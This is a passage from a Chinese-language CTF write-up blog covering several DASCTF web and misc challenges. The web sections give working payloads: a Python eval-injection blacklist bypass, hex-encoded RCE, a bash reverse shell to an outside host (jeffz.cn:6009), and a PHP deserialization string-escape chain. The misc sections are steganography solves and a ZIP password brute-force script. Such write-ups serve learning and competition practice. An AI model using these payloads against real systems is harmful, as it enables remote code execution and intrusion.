sess.get(url)</span><br><span class="line">            html = r.text</span><br><span class="line">            calc = re.findall(<span class="string">r'h4&gt;(.+?)=&lt;/h4'</span>,html)</span><br><span class="line">            result = str(eval(calc[<span class="number">0</span>]))</span><br><span class="line">            inp = result + payload</span><br><span class="line">            r = sess.post(url,data=&#123;<span class="string">"input"</span>:inp&#125;)</span><br><span class="line">            html = r.text</span><br><span class="line">            result = re.findall(<span class="string">r'h3&gt;(.+?)&lt;/h3'</span>,html)</span><br><span class="line">            print(result[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> result[<span class="number">0</span>]==<span class="string">'Congratulations'</span>:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment">#print(mid)</span></span><br><span class="line">    flag += chr(int(mid))</span><br><span class="line">    print(flag)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(flag)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>DASCTF{53a6ee70a3e8c013e2b1dbb2b926d3b2}</p>
</blockquote>
</li>
</ul>
<h3 id="简单的计算题2"><a href="#简单的计算题2" class="headerlink" title="简单的计算题2"></a>简单的计算题2</h3><p>源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request,session</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> black_list,create</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## flag is in /flag try to get it</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(string)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> black_word <span class="keyword">in</span> black_list:</span><br><span class="line">            <span class="keyword">if</span> black_word <span class="keyword">in</span> string:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"hack"</span></span><br><span class="line">        <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        input = request.form[<span class="string">'input'</span>]</span><br><span class="line">        create_question = create()</span><br><span class="line">        input_question = session.get(<span class="string">'question'</span>)</span><br><span class="line">        session[<span class="string">'question'</span>] = create_question</span><br><span class="line">        <span class="keyword">if</span> input_question == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"Invalid session please try again!"</span>, question=create_question)</span><br><span class="line">        <span class="keyword">if</span> filter(input)==<span class="string">"hack"</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"hack"</span>, question=create_question)</span><br><span class="line">        calc_str = input_question + <span class="string">"="</span> + str(input)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            calc_result = str((eval(calc_str)))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">            calc_result = <span class="string">"Invalid"</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=calc_result,question=create_question)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        create_question = create()</span><br><span class="line">        session[<span class="string">'question'</span>] = create_question</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,question=create_question)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/source')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">"app.py"</span>, <span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>这题有black_list，不过有回显，（这样就不用答题了</p>
<p>想用题1的<code>open().read()</code>来读，但是发现<code>read</code>被ban了</p>
<p>这里可以利用<code>__class__</code>和<code>vars()</code>函数或者<code>__dict__</code>属性来实现绕过，这三个东西都没过滤，而且<code>vars()</code>和<code>__dict__</code>用起来是一样的效果</p>
<blockquote>
<p>这里不清楚的话可以分别执行一下下面的东西看看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">open(&#39;&#x2F;flag&#39;,&#39;r&#39;).__class__</span><br><span class="line">vars(open(&#39;&#x2F;flag&#39;,&#39;r&#39;).__class__)</span><br><span class="line">vars(open(&#39;&#x2F;flag&#39;,&#39;r&#39;).__class__)[&#39;read&#39;]</span><br><span class="line">open(&#39;&#x2F;flag&#39;,&#39;r&#39;).__class__.__dict__[&#39;read&#39;]</span><br></pre></td></tr></table></figure>
</blockquote>
<p>因为这里得到的<code>read</code>方法实际上是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xxx</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(self)</span>:</span></span><br><span class="line">    	xxx</span><br></pre></td></tr></table></figure>

<p>需要传入一个self给它，所以需要再输入一遍<code>open(&#39;/flag&#39;,&#39;r&#39;)</code></p>
<p>所以新的payload就出来了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1,open(&#39;&#x2F;flag&#39;,&#39;r&#39;).__class__.__dict__[&#39;re&#39;+&#39;ad&#39;](open(&#39;&#x2F;flag&#39;,&#39;r&#39;))</span><br><span class="line">1,vars(open(&#39;&#x2F;flag&#39;,&#39;r&#39;).__class__)[&#39;re&#39;+&#39;ad&#39;](open(&#39;&#x2F;flag&#39;,&#39;r&#39;))</span><br></pre></td></tr></table></figure>

<p>提交得到flag</p>
<blockquote>
<p>DASCTF{1cd78b58153d9ef4a7da1f5ca15ef7e8}</p>
</blockquote>
<p>因为有回显，所以后面把源码全部扒下来了，研究了一下发现还可以<code>rce</code>、<code>反弹shell</code></p>
<p>扒下来的blacklist：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">black_list = [ <span class="string">'os'</span>, <span class="string">'mro'</span>, <span class="string">'request'</span>, <span class="string">'args'</span>, <span class="string">'eval'</span>, <span class="string">'system'</span>,<span class="string">'if'</span>, <span class="string">'for'</span>,</span><br><span class="line">             <span class="string">'subprocess'</span>, <span class="string">'file'</span>, <span class="string">'builtins'</span>, <span class="string">'compile'</span>, <span class="string">'execfile'</span>, <span class="string">'from_pyfile'</span>, <span class="string">'config'</span>,</span><br><span class="line">             <span class="string">'local'</span>, <span class="string">'self'</span>,<span class="string">'enter'</span>,<span class="string">'%'</span>,<span class="string">'or'</span>,<span class="string">'ls'</span>,<span class="string">'sys'</span>,<span class="string">'globals'</span>,<span class="string">'read'</span>,<span class="string">'popen'</span>]</span><br></pre></td></tr></table></figure>

<p>研究了一下，发现它没有过滤<code>exec</code>，所以我们可以简单地构造一些东西来实现命令执行</p>
<p>RCE payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>,exec(<span class="string">'o'</span>+<span class="string">'s.sy'</span>+<span class="string">'stem("sleep 10")'</span>)</span><br><span class="line"><span class="comment"># 提交上去之后明显地延时了10秒，但是这样写不方便编码，所以我们可以利用bytes来编码</span></span><br><span class="line"><span class="number">1</span>,exec(bytes([<span class="number">111</span>, <span class="number">115</span>, <span class="number">46</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">40</span>, <span class="number">39</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">39</span>, <span class="number">41</span>]).decode())</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"><span class="number">1</span>,exec(bytes.fromhex(<span class="string">'6f732e73797374656d2827736c6565702031302729'</span>).decode())</span><br></pre></td></tr></table></figure>

<p>但是因为<code>exec</code>不会返回命令执行的结果，所以我们利用上<code>open().write()</code>来反弹shell(当然直接用RCE写也可以</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1,open(&#39;&#x2F;tmp&#x2F;c.sh&#39;,&#39;w&#39;).write(&#39;&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;jeffz.cn&#x2F;6009 0&gt;&amp;1&#39;),exec(bytes.fromhex(&#39;6f732e73797374656d28272f62696e2f62617368202f746d702f632e73682729&#39;).decode())</span><br></pre></td></tr></table></figure>

<h3 id="phpuns"><a href="#phpuns" class="headerlink" title="phpuns"></a>phpuns</h3><p>这题给了源码</p>
<p>主要看<code>index.php</code>、<code>functions.php</code>、<code>class.php</code>、<code>info.php</code>这几个，将流程简化一下如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//function.php的一些主要函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0*\0'</span>, $data);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reduce</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = str_replace(<span class="string">'\0*\0'</span>, chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), $data);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr($data, <span class="string">'c2e38'</span>)!==<span class="keyword">False</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'exit'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//class.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $username;</span><br><span class="line">    <span class="keyword">protected</span> $password;</span><br><span class="line">    <span class="keyword">protected</span> $admin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username, $password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker_A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c2e38;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($c2e38)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;c2e38 = $c2e38;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(stristr(<span class="keyword">$this</span>-&gt;c2e38, <span class="string">"admin"</span>)===<span class="keyword">False</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">"must be admin"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">"good luck"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker_B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c2e38;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($c2e38)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;c2e38 = $c2e38;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_c2e38</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;c2e38;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $tmp = <span class="keyword">$this</span>-&gt;get_c2e38();</span><br><span class="line">        $tmp();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'test'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker_C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">'test'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        var_dump(system(<span class="string">'cat /flag'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>] ;</span><br><span class="line">    $user = <span class="keyword">new</span> User($username, $password);</span><br><span class="line">    $_SESSION[<span class="string">'info'</span>] = add(serialize($user));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里实际上会跳转到info.php，下面是info.php的部分源码</span></span><br><span class="line">    check(reduce($_SESSION[<span class="string">'info'</span>]));</span><br><span class="line">    $tmp = unserialize(reduce($_SESSION[<span class="string">'info'</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($tmp-&gt;get_admin() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You must be admin'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很显然这是反序列化题</p>
<p><code>Hacker_A</code>、<code>Hacker_B</code>、<code>Hacker_C</code>这三个可以这样构造在一起，达到执行<code>cat /flag</code>的目的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$c = <span class="keyword">new</span> Hacker_C();</span><br><span class="line">$b = <span class="keyword">new</span> Hacker_B($c);</span><br><span class="line">$a = <span class="keyword">new</span> Hacker_A($b);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//O:8:"Hacker_A":1:&#123;s:5:"c2e38";O:8:"Hacker_B":1:&#123;s:5:"c2e38";O:8:"Hacker_C":1:&#123;s:4:"name";s:4:"test";&#125;&#125;&#125; 一共103个字符</span></span><br></pre></td></tr></table></figure>

<p>再把正常的<code>User</code>打出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;s:11:&quot;%00*%00username&quot;;s:8:&quot;username&quot;;s:11:&quot;%00*%00password&quot;;s:8:&quot;password&quot;;s:8:&quot;%00*%00admin&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>

<p>仔细看这个函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reduce</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = str_replace(<span class="string">'\0*\0'</span>, chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), $data);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会发现它将五个字符替换成了三个字符，可以利用它达到字符逃逸，吞掉<code>username</code>后面的任意字符</p>
<p>很显然这里要吞掉的字符是<code>&quot;;s:11:&quot;%00*%00password&quot;;s:8:&quot;</code>，来达成注入的目的。</p>
<p>因为我们需要注入的东西一共大于100个字符，所以需要吞掉的字符是<code>&quot;;s:11:&quot;%00*%00password&quot;;s:xxx:&quot;</code>这么多，也就是28位</p>
<p>28/(5-3)=14，需要构造14个<code>\0*\0</code></p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&amp;password&#x3D;&quot;;s:11:&quot;%00*%00password&quot;;O:8:&quot;Hacker_A&quot;:1:&#123;s:5:&quot;c2e38&quot;;O:8:&quot;Hacker_B&quot;:1:&#123;s:5:&quot;c2e38&quot;;O:8:&quot;Hacker_C&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;test&quot;;&#125;&#125;&#125;;s:8:&quot;%00*%00admin&quot;;i:1;&#125;&amp;submit&#x3D;Login</span><br></pre></td></tr></table></figure>

<p>当然，我们还需要绕过<code>check</code></p>
<p>这里可以利用大<code>S</code>的特性将字符用16进制表示来绕过，最终编码后的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;u%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0&amp;password&#x3D;%22;S:11:%22%5C00*%5C00password%22;O:8:%22Hacker_A%22:1:%7BS:5:%22%5C632e38%22;O:8:%22Hacker_B%22:1:%7BS:5:%22%5C632e38%22;O:8:%22Hacker_C%22:1:%7Bs:4:%22name%22;s:4:%22test%22;%7D%7D%7D;S:8:%22%5C00*%5C00admin%22;i:1;%7D&amp;submit&#x3D;Login</span><br></pre></td></tr></table></figure>

<blockquote>
<p>DASCTF{7463ace9d0b8a98aa0d8a4ed7038e590}</p>
</blockquote>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="cryptographic-call"><a href="#cryptographic-call" class="headerlink" title="cryptographic_call"></a>cryptographic_call</h3><p>题目给了一串信息<code>PiTXPBoBd3OVOMdheMGSOZXXeJXXOJ1ge64WPMGBc3cCPJKDc7W=.</code>、一张图片和一个没什么用的tip:<code>secret is in the picture but does not destroy the picture</code></p>
<p><img src="https://i.loli.net/2020/06/27/yH9n1gXV8WAx36Y.png" alt="image.png"></p>
<p>很明显可以看到这张图片有一些水纹一样的水印，但是不知道是什么隐写</p>
<p>给的那串信息长得像base64编码，但是解码出来是乱码</p>
<p>然后知道了这个工具 <span class="exturl" data-url="aHR0cDovL251bGxpY2UuY29tL2ltYWdlaW4=">http://nullice.com/imagein<i class="fa fa-external-link-alt"></i></span></p>
<p>把图片拉进去解出来了下面的东西</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0123456789abcdefGHIJKLMNOPQrstuvwXYZghijklmnopqRSTUVW*ABCEDF@xyz</span><br></pre></td></tr></table></figure>

<p>一共64位，将其替换为base64的码表，将信息解码得到flag</p>
<blockquote>
<p>flag{7463ace9d0b8a98aa0d8a4ed7038e590}</p>
</blockquote>
<h3 id="PhysicalHacker"><a href="#PhysicalHacker" class="headerlink" title="PhysicalHacker"></a>PhysicalHacker</h3><p>队里大哥做的（等有空再自己看看），SSID密码是66666666，然后提取流量，获得一堆空白字符</p>
<p>一开始以为是whitespace语言，但是发现编译不了。</p>
<p>然后用 <span class="exturl" data-url="aHR0cDovL3d3dy5kYXJrc2lkZS5jb20uYXUvc25vdy9pbmRleC5odG1s">http://www.darkside.com.au/snow/index.html<i class="fa fa-external-link-alt"></i></span> 这个解出了一串东西</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MZWGCZZANFZTUICOMVYHWNRXGBRDCNBXGI4GCZBZHEYDEYLFMNRGCMZSMUZDEZTBGRTDMYTEPUQGG33OM5ZGCZDVNRQXI2LPNZZSCIJB</span><br></pre></td></tr></table></figure>

<p>用CyberChef解一下（base32）就出来了</p>
<blockquote>
<p>Nep{670b14728ad9902aecba32e22fa4f6bd}</p>
</blockquote>
<h3 id="BaiduYun-amp-Gcode"><a href="#BaiduYun-amp-Gcode" class="headerlink" title="BaiduYun&amp;Gcode"></a>BaiduYun&amp;Gcode</h3><p>题目给了百度网盘本地的一堆sqlite3数据库</p>
<p>其中<code>BaiduYunCacheFileV0.db</code>里面有百度网盘的目录信息</p>
<p>提供了文件的<code>md5</code>、<code>文件大小</code>等，根据文件名称可以发现都是比赛平台（X计划平台）的网页资源文件，将平台的资源文件下载下来比对，发现<code>xshadow.png</code>这个文件是不一样的</p>
<p>现在就是要想办法获得这个不一样的文件</p>
<p>然后看这篇东西 <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzIxMjc1MzY1">https://www.zhihu.com/question/21275365<i class="fa fa-external-link-alt"></i></span></p>
<p>知道了百度网盘的秒传技术，这里可以通过抓包来进行协议分析，然后用fiddler或者burp改包，但是，有现成的轮子干嘛不用？</p>
<p>刚好前段时间下载了<code>BaiduPCS-Go</code>可以实现手动快传（原作者的github库好像删库了，不过有人重新上传了 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZlbGl4b25tYXJzL0JhaWR1UENTLUdv77yJ">https://github.com/felixonmars/BaiduPCS-Go）<i class="fa fa-external-link-alt"></i></span></p>
<p>这个软件的<code>rapidupload</code>命令可以实现手动上传，需要提供文件的<code>md5</code>，<code>文件大小</code>，<code>文件的前256kb切片的md5</code></p>
<p>这里我们只有<code>256kb的md5</code>是不知道的，但是我们可以将平台下载下来的那个文件的前256kb的md5来进行尝试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dd if&#x3D;xshadow.png of&#x3D;xshadow-slip.png count&#x3D;512 bs&#x3D;512</span><br><span class="line">md5sum xshadow-slip.png</span><br></pre></td></tr></table></figure>

<p>获取到md5，然后打开软件，执行以下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rapidupload -length&#x3D;30038207 -md5&#x3D;72b6273dc5c54e8af2490e4acd3a6a3f -slicemd5&#x3D;e973409c4ac718e158be4492ab5d9999 &#x2F;xshadow.png</span><br></pre></td></tr></table></figure>

<p>成功转存，然后下载下来一个28.6MB的图片，用<code>binwalk</code>分离出一个压缩包，里面是gcode代码文件</p>
<p>看到第一行<code>;Generated with Cura_SteamEngine 18.11.13</code>，猜测是3D打印的gcode代码</p>
<p>然后就是找能模拟gcode代码，生成模型的工具了</p>
<p>然后发现大部分的在线工具都卡的要死，最后找到一个能用的<span class="exturl" data-url="aHR0cDovL2djb2RlLndzLw==">http://gcode.ws/<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://i.loli.net/2020/06/27/SGni8retFOC9IE1.png" alt="image.png"></p>
<p>还有一个本地的软件能查看——<code>Repetier-Host</code></p>
<p><img src="https://i.loli.net/2020/06/27/4XuMlF35LJWdDk9.png" alt="image.png"></p>
<p>然后人肉ocr得到flag（队友拿小号拿了一血hhh</p>
<blockquote>
<p>3f09a046774a4c75885e6fb84a95650e</p>
</blockquote>
<h3 id="Keyboard"><a href="#Keyboard" class="headerlink" title="Keyboard"></a>Keyboard</h3><p>听说是安恒四月赛的原题，等我有空再做做看</p>
<blockquote>
<p>flag{4a02f6dc603c377a234df479609d237c}</p>
</blockquote>
<h3 id="透明度"><a href="#透明度" class="headerlink" title="透明度"></a>透明度</h3><p>把图片下载下来很容易发现顶上有东西，根据题目联想到透明度数据，然后编写脚本提出来看看</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.open(<span class="string">'Rgba.png'</span>)</span><br><span class="line">x,y = img.size</span><br><span class="line">alphas = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(y):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(x):</span><br><span class="line">        color = img.getpixel((j,i))</span><br><span class="line">        alpha = color[<span class="number">-1</span>]</span><br><span class="line">        alphas.append(alpha)</span><br><span class="line"></span><br><span class="line">print(alphas)</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">80, 75, 3, 4, 20, 0, 1, 0, 8, 0, 154, 118, 179, 80, 196, 215, 223, 133, 51, 0, 0, 0, 40, 0, 0, 0, 15, 0, 0, 0, 195, 220, 194, 235, 202, 199, 110, 101, 112, 95, 95, 46, 116, 120, 116, 81, 81, 66, 214, 29, 242, 220, 165, 170, 77, 21, 28, 177, 90, 190, 175, 38, 113, 168, 169, 185, 54, 109, 52, 135, 77, 80, 156, 110, 169, 219, 205, 37, 56, 37, 157, 112, 115, 220, 226, 17, 237, 168, 138, 139, 226, 25, 121, 103, 185, 136, 80, 75, 1, 2, 63, 0, 20, 0, 1, 0, 8, 0, 154, 118, 179, 80, 196, 215, 223, 133, 51, 0, 0, 0, 40, 0, 0, 0, 15, 0, 36, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0, 195, 220, 194, 235, 202, 199, 110, 101, 112, 95, 95, 46, 116, 120, 116, 10, 0, 32, 0, 0, 0, 0, 0, 1, 0, 24, 0, 32, 115, 214, 28, 170, 45, 214, 1, 138, 213, 252, 200, 170, 45, 214, 1, 7, 238, 176, 212, 229, 44, 214, 1, 80, 75, 5, 6, 0, 0, 0, 0, 1, 0, 1, 0, 97, 0, 0, 0, 96, 0, 0, 0, 0, 0</span><br></pre></td></tr></table></figure>

<p>因为这些数据有大有小，不像是Ascii码，所以转成hex看看，然后发现是zip文件</p>
<p><img src="https://i.loli.net/2020/06/27/UFZARXQBE9N3S2k.png" alt="image.png"></p>
<p>提出来，压缩包里有个文件，名字是<code>密码是nep__.txt</code></p>
<p>显而易见了，生成个字典然后爆破</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">print(string.printable)</span><br><span class="line"></span><br><span class="line">pa=<span class="string">'nep'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'d.txt'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">            f.write(pa+i+j+<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/06/27/zNAvgeHB48jEIih.png" alt="image.png"></p>
<p>解压得到flag</p>
<blockquote>
<p>a22a96d7fc5dfd2182c593630851e44fed0adbe6</p>
</blockquote>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>writeup</tag>
        <tag>DASCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>0CTF/TCTF 2020</title>
    <url>/2020/06/29/0ctf2020/</url>
    <content><![CDATA[<p>不愧是tctf，比赛的时候就没做出几道题</p>
<p>参考wp : <span class="exturl" data-url="aHR0cHM6Ly9za3lzZWMudG9wLzIwMjAvMDYvMjcvMjAyMC1UQ1RGLU9ubGluZS1XZWItV3JpdGVVcC8j5YmN6KiA">https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/#%E5%89%8D%E8%A8%80<i class="fa fa-external-link-alt"></i></span></p>
